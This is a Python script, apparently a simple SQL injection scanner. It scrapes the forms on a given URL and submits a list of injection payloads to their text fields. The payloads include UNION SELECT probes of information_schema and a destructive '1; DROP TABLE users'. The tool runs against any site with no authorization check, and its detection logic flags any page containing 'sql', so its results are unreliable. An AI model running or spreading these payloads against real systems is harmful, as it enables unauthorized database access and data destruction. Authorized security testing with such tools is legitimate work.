import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
from urllib.parse import urljoin

def get_forms(url):
    """Get all forms from the given URL."""
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def get_form_details(form):
    """Extract details from a form."""
    details = {}
    action = form.attrs.get('action', '').lower()  # Provide a default value if 'action' is missing
    method = form.attrs.get('method', 'get').lower()
    inputs = []

    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        inputs.append({'type': input_type, 'name': input_name})

    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form(form_details, url, payload):
    """Submit a form with a given payload."""
    target_url = urljoin(url, form_details['action'])
    data = {}
    for input in form_details['inputs']:
        if input['type'] == 'text' or input['type'] == 'search':
            data[input['name']] = payload
        else:
            data[input['name']] = 'test'

    if form_details['method'] == 'post':
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def test_sql_injection(url):
    payloads = [
        "1 OR 1=1",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users",
        "' OR '1'='1' /*",
        "' OR 1=1#",
        "1' AND '1'='1",
        "' UNION SELECT NULL, NULL, NULL --",
        "1' AND 1=0 UNION SELECT 'a', 'b', 'c'--",
        "' OR 'a'='a'--",
        "' OR 'a'='a'/*",
        "1' AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables--",
        "' OR 'x'='x",
        "1' ORDER BY 1--",
        "' OR 1=1 LIMIT 1 OFFSET 1--"
    ]

    forms = get_forms(url)

    if not forms:
        print(f"\n{Fore.LIGHTBLUE_EX}[INFO] {Style.RESET_ALL}No forms found. Skipping SQL injection.")
    else:
        try:
            print(f"\n{Fore.LIGHTGREEN_EX}Form(s) found.{Style.RESET_ALL}")
            print(f"SQL Injection test for {url}:\n")
            for form in forms:
                form_details = get_form_details(form)
                for payload in payloads:
                    response = submit_form(form_details, url, payload)
                    if "sql" in response.text.lower() or response.status_code == 500:
                        print(f"{Fore.RED}[VULNERABLE] {Style.RESET_ALL}Possible SQL Injection: {form_details['action']} with payload: {payload}")
                    else:
                        print(f"{Fore.LIGHTGREEN_EX}[SAFE] {Style.RESET_ALL}No SQL Injection detected for payload: {payload}")
        except Exception:
            print(f"{Fore.LIGHTGREEN_EX}[ERROR] {Style.RESET_ALL}A problem occurred when doing SQL injections.")
